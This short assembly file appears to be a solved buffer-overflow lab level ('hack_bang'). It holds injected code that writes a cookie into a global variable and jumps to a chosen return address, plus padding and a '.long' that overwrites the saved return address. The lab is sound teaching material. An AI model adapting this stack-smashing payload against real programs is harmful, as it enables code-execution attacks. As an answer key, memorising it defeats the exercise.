COOKIE   = 0x7d97e567
VARADDR  = 0x0804d138
RETADDR  = 0x08048c55
HACKADDR = 0x556834a8

hack_bang:
    mov $COOKIE, %eax
    mov %eax, VARADDR
    push $RETADDR
    ret

.fill (40 - (. - hack_bang)), 1, 0

.long 0
.long HACKADDR
